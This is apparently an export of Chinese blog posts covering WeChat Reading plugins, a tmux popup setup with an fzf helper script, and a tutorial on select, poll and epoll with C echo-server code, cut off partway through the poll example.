[{"title":"微信读书PC插件","url":"%2Fp%2F6776959d.html","content":"\n多看阅读：目前观看体验，排版还是iOS最好的，奈何同步导出功能越来越弱，属于不再维护状态。\n\nneatreader：多端进度可以实时同步，需要花钱。\n\n微信读书：上传自己的书多端进度可以实时同步，免费。\n\n> 放弃多看阅读，neatreader，携桶转移到微信读书。\n\n<!-- more -->\n\n### 1.1 Chrome 插件\n\n- 微信读书助手：<https://github.com/ellipse42/weread_helper_extension>（主题&宽度&组队）\n- 微信读书做笔记：<https://github.com/Higurashi-kagome/wereader>（主题&导出增强）\n\n### 1.2 油猴插件\n\n- 微信读书阅读助手 https://greasyfork.org/zh-CN/scripts/420774\n\t- 下滑优雅隐藏顶栏和侧边栏\n\t- 简化复杂的划线菜单\n- 微信读书加宽度：https://greasyfork.org/zh-CN/scripts/418878\n- 微信读书到html：https://greasyfork.org/zh-CN/scripts/450169\n- 最好的阅读模式：https://greasyfork.org/zh-CN/scripts/463671 [一个够用]\n- 综合可自动：https://greasyfork.org/zh-CN/scripts/440339 [一个够用]\n\n### 1.3 Obsidian 导出插件\n\nhttps://github.com/zhaohongxuan/obsidian-weread-plugin [必备]\n\n```ini\n---\ntitle: 《{{metaData.title}}》\ndate: {{metaData.lastReadDate}}\n---\n\n{% for chapter in chapterHighlights %}\n## {{chapter.chapterTitle}}\n{% for highlight in chapter.highlights %}\n{% if highlight.reviewContent %}{% else %}\n- 📌 {{ highlight.markText |trim }} \n    - ⏱ {{highlight.createTime}}{% endif %} {% endfor %}{% endfor %}\n\n# 读书笔记\n{% for chapter in bookReview.chapterReviews %}{% if chapter.reviews or chapter.chapterReview %}\n## {{chapter.chapterTitle}}\n{% if  chapter.chapterReviews %}{% for chapterReview in chapter.chapterReviews %}\n### 章节评论 No.{{loop.index}}\n- {{chapterReview.content}} ^{{chapterReview.reviewId}}\n    - ⏱ {{chapterReview.createTime}} {% endfor%}{%endif %}{% if chapter.reviews %}{%for review in chapter.reviews %}\n### 划线评论\n- 📌 {{review.abstract |trim }}  ^{{review.reviewId}}\n    - 💭 {{review.content}}\n    - ⏱ {{review.createTime}}\n{% endfor %} {%endif %} {% endif %} {% endfor %}\n\n# 本书评论\n{% if bookReview.bookReviews %}{% for bookReview in bookReview.bookReviews %}\n## 书评 No.{{loop.index}} \n{{bookReview.mdContent}} ^{{bookReview.reviewId}}\n⏱ {{bookReview.createTime}}\n{% endfor%}{% endif %}\n```\n","categories":["读书"]},{"title":"tmux的弹窗功能和fzf搜索","url":"%2Fp%2F1104a363.html","content":"\n# 1. 介绍\n\ntmux 已经支持 popup功能, 但是暂时还没有发布到 stable release 版本, 所以需要使用的需要在开发分支上编译使用, 即tmux 版本需要>=3.2\n\n![image-20210311105854535](tmux%E7%9A%84%E5%BC%B9%E7%AA%97%E5%8A%9F%E8%83%BD%E5%92%8Cfzf%E6%90%9C%E7%B4%A2/image-20210311105854535.png)\n\n<!-- more -->\n\n# 2. 使用\n\n### 2.1 升级 tmux \n\n确认下 tmux 版本, 如果小于3.2就开始升级.\n\n```bash\ntmux -V\n```\n\nhttps://github.com/tmux/tmux/releases 下载最新的 release, 编译安装\n\n```bash\n./configure && make\nsudo make install\n```\n\n注意: 升级后如果开启了`tmux-resurrect`,  session会直接卡死\n\n需要把session 杀完后, 并 `tmux kill-server `, 再进一次 (巨坑!!!)\n\n### 2.2 tmux 内使用\n\n弹出一个80%宽高的弹窗\n\n```bash\ntmux popup -w 80% -h 80%\n```\n\n创建两个别名:\n\n\n```bash\nalias p='tmux popup -w 80% -h 80%' \nalias pp='tmux popup -w 90% -h 90%  \"tmux attach -t popup || tmux new -s popup\"'\n```\n\n\n\n# 3. fzf-tmux （弹窗使用fzf）\n\n在tmux里通过弹窗形式使用 fzf,  参考: https://github.com/kevinhwang91/fzf-tmux-script/\n\n![image-20210311104129324](tmux%E7%9A%84%E5%BC%B9%E7%AA%97%E5%8A%9F%E8%83%BD%E5%92%8Cfzf%E6%90%9C%E7%B4%A2/image-20210311104129324.png)\n\n### 3.1 安装\n\n下面是fzfp脚本,  给个执行权限, 扔到环境变量下, 如 `~/.fzf/bin/`\n\n```shell\n#!/usr/bin/env bash\n\nfail() {\n    echo \"$1\" >&2\n    exit 2\n}\n\nfzf=$(command -v fzf 2>/dev/null) || fzf=$(dirname $0)/fzf\n[[ -x \"$fzf\" ]] || fail 'fzf executable not found'\n\nif [[ -n $TMUX_POPUP_NESTED_FB ]]; then\n    eval \"$TMUX_POPUP_NESTED_FB\" && exec fzf \"$@\"\nfi\n\ntmux -V | awk '{match($0, /[0-9]+\\.[0-9]+/, m);exit m[0]<3.2}' || exec fzf \"$@\"\n\nargs=('--no-height')\nwhile (($#)); do\n    arg=$1\n    case $arg in\n    --height | --width)\n        eval \"${arg:2}=$2\"\n        shift\n        ;;\n    --height=* | --width=*)\n        eval \"${arg:2}\"\n        ;;\n    *)\n        args+=(\"$arg\")\n        ;;\n    esac\n    shift\ndone\n\nopts=$(printf '%q ' \"${args[@]}\")\n\n[[ -z $height ]] && height=${TMUX_POPUP_HEIGHT:-80%}\n[[ -z $width ]] && width=${TMUX_POPUP_WIDTH:-80%}\n\nenvs=\"SHELL=$SHELL\"\n[[ -n $FZF_DEFAULT_OPTS ]] && envs=\"$envs FZF_DEFAULT_OPTS=$(printf %q \"$FZF_DEFAULT_OPTS\")\"\n[[ -n $FZF_DEFAULT_COMMAND ]] && envs=\"$envs FZF_DEFAULT_COMMAND=$(printf %q \"$FZF_DEFAULT_COMMAND\")\"\n\nid=$RANDOM\ncmd_file=\"${TMPDIR:-/tmp}/fzf-cmd-file-$id\"\npstdin=\"${TMPDIR:-/tmp}/fzf-pstdin-$id\"\npstdout=\"${TMPDIR:-/tmp}/fzf-pstdout-$id\"\n\nclean_cmd=\"command rm -f $cmd_file $pstdin $pstdout\"\n\ncleanup() {\n    eval \"$clean_cmd\"\n}\ntrap 'cleanup' EXIT\n\nmkfifo \"$pstdout\"\n\necho -n \"trap '$clean_cmd' EXIT SIGINT SIGTERM SIGHUP;\" >\"$cmd_file\"\n\nif [[ -t 0 ]]; then\n    echo -n \"$fzf $opts > $pstdout\" >>\"$cmd_file\"\nelse\n    mkfifo \"$pstdin\"\n    echo -n \"$fzf $opts < $pstdin > $pstdout\" >>\"$cmd_file\"\n    cat <&0 >\"$pstdin\" &\nfi\ncat \"$pstdout\" &\ntmux popup -d '#{pane_current_path}' -xC -yC -w$width -h$height -E \"$envs bash $cmd_file\"\n```\n\n并且在 zshrc 下 增加启动脚本:\n\n```shell\nif [[ -n $TMUX_PANE ]] && (( $+commands[tmux] )) && (( $+commands[fzfp] )); then\n    # fallback to normal fzf if current session name is `floating`\n    export TMUX_POPUP_NESTED_FB='test $(tmux display -pF \"#{==:#S,floating}\") == 1'\n\n    export TMUX_POPUP_WIDTH=80%\nfi\n```\n\n简单创建一个别名:\n\n```bash\nalias f=\"fzfp --preview 'cat {}'\"\n```\n\n![image-20210311105110624](tmux%E7%9A%84%E5%BC%B9%E7%AA%97%E5%8A%9F%E8%83%BD%E5%92%8Cfzf%E6%90%9C%E7%B4%A2/image-20210311105110624.png)\n\n#  4. tmux-fzf (管理tmux)\n\n通过 fzf 管理 tmux 工作环境, 也可以通过弹窗形式.  参考:  https://github.com/sainnhe/tmux-fzf\n\n### 4.1 安装\n\n+ Add this line to your `~/.tmux.conf`\n\n  ```bash\n  set -g @plugin 'sainnhe/tmux-fzf'\n  ```\n\n+ Reload configuration, then press prefix + I.\n\n+ To launch tmux-fzf, press prefix + F (Shift+F).\n\n![image-20210311105721312](tmux%E7%9A%84%E5%BC%B9%E7%AA%97%E5%8A%9F%E8%83%BD%E5%92%8Cfzf%E6%90%9C%E7%B4%A2/image-20210311105721312.png)\n\n\n\n# 5. 参考资料\n\n+ https://github.com/tmux/tmux/issues/1842\n+ https://blog.meain.io/2020/tmux-flating-scratch-terminal/\n+ https://github.com/kevinhwang91/fzf-tmux-script\n+ https://github.com/sainnhe/tmux-fzf\n\n","tags":["tmux"],"categories":["tmux"]},{"title":"io多路复用select_poll_epoll","url":"%2Fp%2F457c2d1f.html","content":"\n# 1. 基础概念\n\n### 1.1 内核态和用户态\n\nLinux系统中分为内核态(Kernel model)和用户态(User model)，CPU会在两个model之间切换。\n\n+ 内核态代码拥有完全的底层资源控制权限，可以执行任何CPU指令，访问任何内存地址，其占有的处理机是不允许被抢占的。内核态的指令包括：启动I/O，内存清零，修改程序状态字，设置时钟，允许/终止中断和停机。内核态的程序崩溃会导致PC停机。\n\n+ 用户态是用户程序能够使用的指令，不能直接访问底层硬件和内存地址。用户态运行的程序必须委托系统调用来访问硬件和内存。用户态的指令包括：控制转移，算数运算，取数指令，访管指令（使用户程序从用户态陷入内核态）。\n\n<!-- more -->\n\n### 1.2 用户态和内核态的切换\n\n用户态切换到内核态有三种方式： \n\n##### 1. 系统调用\n\n这是用户态进程主动要求切换到内核态的一种方式，用户态进程通过系统调用申请使用操作系统提供的服务程序完成工作，比如前例中fork()实际上就是执行了一个创建新进程的系统调用。而系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现，例如Linux的int 80h中断。 \n\n##### 2. 异常\n\n当CPU在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。\n\n##### 3. 外围设备的中断\n\n当外围设备完成用户请求的操作后，会向CPU发出相应的中断信号，这时CPU会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。\n\n\n\n# 2. 多服务模型\n\n### 2.1  多进程模型\n\n服务器的主进程负责监听客户的连接，一旦与客户端连接完成，accept() 函数就会返回一个「已连接 Socket」，这时就通过 fork() 函数创建一个子进程，实际上就把父进程所有相关的东西都复制一份，包括文件描述符、内存地址空间、程序计数器、执行的代码等。\n\n这两个进程刚复制完的时候，几乎一模一样。不过，会根据返回值来区分是父进程还是子进程，如果返回值是 0，则是子进程；如果返回值是其他的整数，就是父进程。\n\n正因为子进程会复制父进程的文件描述符，于是就可以直接使用「已连接 Socket 」和客户端通信了，\n\n<img src=\"io多路复用select_poll_epoll/多进程.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n可以发现，子进程不需要关心「监听 Socket」，只需要关心「已连接 Socket」；父进程则相反，将客户服务交给子进程来处理，因此父进程不需要关心「已连接 Socket」，只需要关心「监听 Socket」。\n\n### 2.2 多线程模型\n\n当服务器与客户端 TCP 完成连接后，通过 pthread_create() 函数创建线程，然后将「已连接 Socket」的文件描述符传递给线程函数，接着在线程里和客户端进行通信，从而达到并发处理的目的。\n\n如果每来一个连接就创建一个线程，线程运行完后，还得操作系统还得销毁线程，虽说线程切换的上写文开销不大，但是如果频繁创建和销毁线程，系统开销也是不小的。\n\n那么，我们可以使用线程池的方式来避免线程的频繁创建和销毁，所谓的线程池，就是提前创建若干个线程，这样当由新连接建立时，将这个已连接的 Socket 放入到一个队列里，然后线程池里的线程负责从队列中取出「已连接 Socket 」进行处理。\n\n<img src=\"io多路复用select_poll_epoll/线程池.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n上面基于进程或者线程模型的，其实还是有问题的。新到来一个 TCP 连接，就需要分配一个进程或者线程，那么如果要达到 C10K（同时处理 10000 个并发连接的能力），意味着要一台机器维护 1 万个连接，相当于要维护 1 万个进程/线程，操作系统就算死扛也是扛不住的。\n\n\n\n# 2. IO多路复用\n\n为每个客户端创建一个线程，服务器端的线程资源很容易被耗光。当然还有个聪明的办法，我们可以每 accept 一个客户端连接后，将这个文件描述符（connfd）放到一个数组里。然后弄一个新的线程去不断遍历这个数组，调用每一个元素的非阻塞 read 方法。\n\n```c\naccept  ->  fdlist.add(connfd);\n\n\nwhile(1) {\n  for(fd <-- fdlist) {\n    if(read(fd) != -1) {\n      doSomeThing();\n    }\n  }\n}\n```\n\n\n\n但这和我们用多线程去将阻塞 IO 改造成看起来是非阻塞 IO 一样，这种遍历方式也只是我们用户自己想出的小把戏，每次遍历遇到 read 返回 -1 时仍然是一次浪费资源的系统调用。在 while 循环里做系统调用，就好比你做分布式项目时在 while 里做 rpc 请求一样，是不划算的。\n\n所以，还是得恳请操作系统老大，提供给我们一个有这样效果的函数，我们将一批文件描述符通过一次系统调用传给内核，由内核层去遍历，才能真正解决这个问题。\n\n\n\n### 2.1 select \n\nselect 实现多路复用的方式是，将已连接的 Socket 都放到一个文件描述符集合，然后调用 select 函数将文件描述符集合拷贝到内核里，让内核来检查是否有网络事件产生，检查的方式很粗暴，就是通过遍历文件描述符集合的方式，当检查到有事件产生后，将此 Socket 标记为可读或可写， 接着再把整个文件描述符集合拷贝回用户态里，然后用户态还需要再通过遍历的方法找到可读或可写的 Socket，然后再对其处理。\n\n所以，对于 select 这种方式，需要进行 2 次「遍历」文件描述符集合，一次是在内核态里，一个次是在用户态里 ，而且还会发生 2 次「拷贝」文件描述符集合，先从用户空间传入内核空间，由内核修改后，再传出到用户空间中。\n\n\n\n```c\nint select(\n    int nfds,  // nfds:监控的文件描述符集里最大文件描述符加1\n    fd_set *readfds, // readfds：监控有读数据到达文件描述符集合，传入传出参数\n    fd_set *writefds, // writefds：监控写数据到达文件描述符集合，传入传出参数\n    fd_set *exceptfds, // exceptfds：监控异常发生达文件描述符集合, 传入传出参数\n    struct timeval *timeout); // timeout：定时阻塞监控时间，3种情况  1.NULL，永远等下去 2.设置timeval，等待固定时间 3.设置timeval里时间均为0，检查描述字后立即返回，轮询\n```\n\n\n\nselect 函数监视的文件描述符分3类，分别是writefds、readfds、和exceptfds。调用后select函数会阻塞，直到有描述副就绪（有数据 可读、可写、或者有异常），或者超时（timeout指定等待时间，如果立即返回设为null即可），函数返回。当select函数返回后，可以 通过遍历fdset，来找到就绪的描述符。\n\n\n\n首先一个线程不断接受客户端连接，并把 socket 文件描述符放到一个 list 里。\n\n```text\nwhile(1) {\n  connfd = accept(listenfd);\n  fcntl(connfd, F_SETFL, O_NONBLOCK);\n  fdlist.add(connfd);\n}\n```\n\n然后，另一个线程不再自己遍历，而是调用 select，将这批文件描述符 list 交给操作系统去遍历。\n\n```text\nwhile(1) {\n  // 把一堆文件描述符 list 传给 select 函数\n  // 有已就绪的文件描述符就返回，nready 表示有多少个就绪的\n  nready = select(list);\n  ...\n}\n```\n\n只不过，操作系统会将准备就绪的文件描述符做上标识，用户层将不会再有无意义的系统调用开销。\n\n```text\nwhile(1) {\n  nready = select(list);\n  // 用户层依然要遍历，只不过少了很多无效的系统调用\n  for(fd <-- fdlist) {\n    if(fd != -1) {\n      // 只读已就绪的文件描述符\n      read(fd, buf);\n      // 总共只有 nready 个已就绪描述符，不用过多遍历\n      if(--nready == 0) break;\n    }\n  }\n}\n```\n\n![img](io多路复用select_poll_epoll/v2-320be0c91e2a376199b1d5eef626758e_720w.gif)\n\n可以看出几个细节：\n\n1. select 调用需要传入 fd 数组，需要拷贝一份到内核，高并发场景下这样的拷贝消耗的资源是惊人的。（可优化为不复制）\n2. select 在内核层仍然是通过遍历的方式检查文件描述符的就绪状态，是个同步过程，只不过无系统调用切换上下文的开销。（内核层可优化为异步事件通知）\n3. select 仅仅返回可读文件描述符的个数，具体哪个可读还是要用户自己遍历。（可优化为只返回给用户就绪的文件描述符，无需用户做无效的遍历）\n4. 另外select 还有1024的限制。\n\n\n\n<img src=\"io多路复用select_poll_epoll/v2-6d9944887990eaf8714438351a196301_720w.jpg\" alt=\"img\" style=\"zoom:70%;\" />\n\n可以看到，这种方式，既做到了一个线程处理多个客户端连接（文件描述符），又减少了系统调用的开销（多个文件描述符只有一次 select 的系统调用 + n 次就绪状态的文件描述符的 read 系统调用）。\n\n### 2.2 poll \n\n> 只解除了select 数量1024的限制\n\n\n\n```c\nint poll(struct pollfd *fds, nfds_tnfds, int timeout);\n\n\n\nstruct pollfd {\n  intfd; /*文件描述符*/\n  shortevents; /*监控的事件*/\n  shortrevents; /*监控事件中满足条件返回的事件*/\n};\n```\n\n\n\npoll和select非常相似，poll并没着手解决性能问题，poll只是解决了select的问题 fds集合大小1024限制问题。所以是个鸡肋。\n\n\n\n### 2.3 epoll\n\n> 一次系统调用 + 内核层遍历这些文件描述符\n\n\n\n还记得上面说的 select 的三个细节么？\n\n1. select 调用需要传入 fd 数组，需要拷贝一份到内核，高并发场景下这样的拷贝消耗的资源是惊人的。（可优化为不复制）\n2. select 在内核层仍然是通过遍历的方式检查文件描述符的就绪状态，是个同步过程，只不过无系统调用切换上下文的开销。（内核层可优化为异步事件通知）\n3. select 仅仅返回可读文件描述符的个数，具体哪个可读还是要用户自己遍历。（可优化为只返回给用户就绪的文件描述符，无需用户做无效的遍历）\n\n\n\n所以 epoll 主要就是针对这三点进行了改进。\n\n1. 内核中保存一份文件描述符集合，无需用户每次都重新传入，只需告诉内核修改的部分即可。\n2. 内核不再通过轮询的方式找到就绪的文件描述符，而是通过异步 IO 事件唤醒。\n3. 内核仅会将有 IO 事件的文件描述符返回给用户，用户也无需遍历整个文件描述符集合。\n\n\n\n具体，操作系统提供了这三个函数。\n\n<img src=\"io多路复用select_poll_epoll/epoll.png\" alt=\"img\" style=\"zoom:67%;\" />\n\n##### 第一步，创建一个 epoll 句柄\n\n```c\nint epoll_create(int size);\n```\n\nsize用来告诉内核这个监听的数目一共有多大。新版本用红黑树，这个参数意义不大了。\n\n\n\n##### 第二步，向内核添加、修改或删除要监控的文件描述符。\n\n```c\nint epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);\n```\n\n+ epfd：是epoll_create()的返回值。\n\n+ op：表示op操作，分别添加、删除和修改对fd的监听事件。\n\n  + 添加EPOLL_CTL_ADD，\n  + 删除EPOLL_CTL_DEL，\n  + 修改EPOLL_CTL_MOD。\n\n+ fd：是需要监听的fd（文件描述符）\n\n+ epoll_event：是告诉内核需要监听什么事，struct epoll_event结构如下：\n\n  ```c\n  struct epoll_event {\n    __uint32_t events;  /* Epoll events */\n    epoll_data_t data;  /* User data variable */\n  };\n  ```\n\n  events可以是以下几个宏的集合：\n\n  + EPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）；\n  + EPOLLOUT：表示对应的文件描述符可以写；\n  + EPOLLPRI：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）；\n  + EPOLLERR：表示对应的文件描述符发生错误；\n  + EPOLLHUP：表示对应的文件描述符被挂断；\n  + EPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)来说的。\n  + EPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里\n\n\n\n##### 第三步，epoll_wait 调用\n\n```c\nint epoll_wait(int epfd, struct epoll_event *events, int max events, int timeout);\n```\n\n![img](io多路复用select_poll_epoll/v2-70f8e9bc1a028d252c01c32329e49341_720w.gif)\n\n等待epfd上的io事件，最多返回maxevents个事件。\n\n参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个maxevents的值不能大于创建epoll_create()时的size\n\n参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。\n\n该函数返回需要处理的事件数目，如返回0表示已超时。\n\n\n\n# 3. 为什么有 epoll\n\n### 3.1 io 的演变\n\n一切的开始，都起源于这个 read 函数是操作系统提供的，而且是阻塞的，我们叫它 **阻塞 IO**。\n\n为了破这个局，程序员在用户态通过多线程来防止主线程卡死。\n\n后来操作系统发现这个需求比较大，于是在操作系统层面提供了非阻塞的 read 函数，这样程序员就可以在一个线程内完成多个文件描述符的读取，这就是 **非阻塞 IO**。\n\n但多个文件描述符的读取就需要遍历，当高并发场景越来越多时，用户态遍历的文件描述符也越来越多，相当于在 while 循环里进行了越来越多的系统调用。\n\n后来操作系统又发现这个场景需求量较大，于是又在操作系统层面提供了这样的遍历文件描述符的机制，这就是 **IO 多路复用**。\n\n多路复用有三个函数，最开始是 select，然后又发明了 poll 解决了 select 文件描述符的限制，然后又发明了 epoll 解决 select 的三个不足。\n\n### 3.2  epoll的意义\n\n所以，IO 模型的演进，其实就是时代的变化，倒逼着操作系统将更多的功能加到自己的内核而已。如果你建立了这样的思维，很容易发现网上的一些错误。\n\n比如好多文章说，多路复用之所以效率高，是因为用一个线程就可以监控多个文件描述符。\n\n这显然是知其然而不知其所以然，多路复用产生的效果，完全可以由用户态去遍历文件描述符并调用其非阻塞的 read 函数实现。而多路复用快的原因在于，操作系统提供了这样的系统调用，使得原来的 while 循环里多次系统调用，变成了一次系统调用 + 内核层遍历这些文件描述符。\n\n就好比我们平时写业务代码，把原来 while 循环里调 http 接口进行批量，改成了让对方提供一个批量添加的 http 接口，然后我们一次 rpc 请求就完成了批量添加一个道理。\n\n### 3.3  epoll使用了mmap了吗\n\n不少博客中提到，epoll_wait返回时，对于就绪的事件，epoll使用的是共享内存的方式，即用户态和内核态都指向了就绪链表，所以就避免了内存拷贝消耗。\n\n这是错的！看过 epoll 内核源码的都知道，**压根就没有使用共享内存这个玩意**。你可以从下面这份代码看到， epoll_wait 实现的内核代码中调用了 `__put_user` 函数，这个函数就是将数据从内核拷贝到用户空间。\n\n<img src=\"io多路复用select_poll_epoll/epoll_mmap.png\" alt=\"img\" style=\"zoom:50%;\" />\n\n### 3.4 epoll 边缘触发(ET)和水平触发(LT)\n\nepoll 支持两种事件触发模式，分别是边缘触发（edge-triggered，ET）和水平触发（level-triggered，LT）。epoll 默认的触发模式是水平触发。\n\n\n\n使用边缘触发模式时，当被监控的 Socket 描述符上有可读事件发生时，服务器端只会从 epoll_wait 中苏醒一次，即使进程没有调用 read 函数从内核读取数据，也依然只苏醒一次，因此我们程序要保证一次性将内核缓冲区的数据读取完；\n\n使用水平触发模式时，当被监控的 Socket 上有可读事件发生时，服务器端不断地从 epoll_wait 中苏醒，直到内核缓冲区数据被 read 函数读完才结束，目的是告诉我们有数据需要读取；\n\n\n\n水平触发的意思是只要满足事件的条件，比如内核中有数据需要读，就一直不断地把这个事件传递给用户；而边缘触发的意思是只有第一次满足条件的时候才触发，之后就不会再传递同样的事件了。\n\n\n\n如果使用边缘触发模式，I/O 事件发生时只会通知一次，而且我们不知道到底能读写多少数据，所以在收到通知后应尽可能地读写数据，以免错失读写的机会。因此，我们会循环从文件描述符读写数据，那么如果文件描述符是阻塞的，没有数据可读写时，进程会阻塞在读写函数那里，程序就没办法继续往下执行。所以，**边缘触发模式一般和非阻塞 I/O 搭配使用**，程序会一直执行 I/O 操作，直到系统调用（如 read 和 write）返回错误，错误类型为 EAGAIN 或 EWOULDBLOCK。\n\n一般来说，边缘触发的效率比水平触发的效率要高，因为边缘触发可以减少 epoll_wait 的系统调用次数，系统调用也是有一定的开销的的，毕竟也存在上下文的切换。\n\nselect/poll 只有水平触发模式，epoll 默认的触发模式是水平触发，但是可以根据应用场景设置为边缘触发模式。\n\n### \n\n# 4. 代码\n\n### 4.1 select\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <sys/select.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\n  int opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\tint clients[FD_SETSIZE]; \n\tfor (int i = 0; i < FD_SETSIZE; ++i) {\n\t\tclients[i] = -1;\n\t}\n\tfd_set rset, allset;\n\tFD_ZERO(&allset);\n\tFD_SET(server_id, &allset);\n\tint maxfd = server_id;\n\tint maxi = -1;\n\n\twhile (1) {\n\t\trset = allset;\n    // 只监听读描述符\n\t\tint iready = select(maxfd+1, &rset, NULL, NULL, NULL);\n\t\tif (iready < 0) {\n\t\t\tperr_exit(\"select error\");\n\t\t}\n\n\t\tif (FD_ISSET(server_id, &rset)) {\n\t\t\t// 说明有新的 client 写\n\t\t\tsocklen_t len = sizeof(client);\n\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\n\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\t\n\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\tint i = 0;\n\t\t\tfor (; i < FD_SETSIZE; ++i) {\n\t\t\t\tif (clients[i] < 0) {\n\t\t\t\t\tclients[i] = client_id;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (i == FD_SETSIZE) {\n\t\t\t\tfputs(\"too many clients\\n\", stderr);\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tFD_SET(client_id, &allset);\n\t\t\tif (client_id > maxfd) {\n\t\t\t\tmaxfd = client_id;\n\t\t\t}\n\t\t\tif (i > maxi) {\n\t\t\t\tmaxi = i;\n\t\t\t}\n\t\t\tif (--iready == 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tfor (int i = 0; i <= maxi; ++i) {\n\t\t\tint fd = clients[i];\n\t\t\tif (fd < 0) {\n\t\t\t\tcontinue;\t\n\t\t\t}\n\t\t\tif (FD_ISSET(fd, &rset)) {\n\t\t\t\tint n = Read(fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(fd);\n\t\t\t\t\tFD_CLR(fd, &allset);\n\t\t\t\t\tclients[i] = -1;\n\t\t\t\t} else {\n\t\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t\t}\n\t\t\t\t\tWrite(fd, buf, n);\n\t\t\t\t}\n\t\t\t\tif (--iready == 0) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn 0;\n}\n```\n\n`client.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n\n#define PORT 8000\n#define MAXLINE 1024\nint main(int argc, char* agrv[])\n{\n\tchar buf[MAXLINE];\n\tmemset(buf, 0, sizeof(buf));\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(PF_INET, \"127.0.0.1\", &server.sin_addr);\n\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\twhile (fgets(buf, MAXLINE, stdin) != NULL) {\n\t\tWrite(server_id, buf, strlen(buf));\n\t\tint n = Read(server_id, buf, MAXLINE);\n\t\tif (n == 0) {\n\t\t\tprintf(\"the other side has been closed.\\n\");\n\t\t} else {\n\t\t\tWrite(STDOUT_FILENO, buf, n);\n\t\t}\n\t}\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.2 poll\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <sys/select.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <poll.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\n#define OPEN_MAX 1000\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\n\tint opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\n\tstruct pollfd clients[OPEN_MAX];\n\tclients[0].fd = server_id;\n\tclients[0].events = POLLIN;\n\tfor (int i = 1; i < OPEN_MAX; i++) {\n\t\tclients[i].fd = -1;\n\t}\n\n\tint maxi = 0;\n\twhile (1) {\n    // 监听 POLLIN 事件\n\t\tint iready = poll(clients, maxi+1, -1);\t\n\t\tif (iready < 0) {\n\t\t\tperr_exit(\"poll error\");\n\t\t}\n\t\t\n    // 说明 client 来了写\n\t\tif (clients[0].revents & POLLIN) {\n\t\t\tsocklen_t len = sizeof(client);\n\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\t\n\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\n\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\tint i = 1;\n\t\t\tfor (; i < OPEN_MAX; ++i) {\n\t\t\t\tif 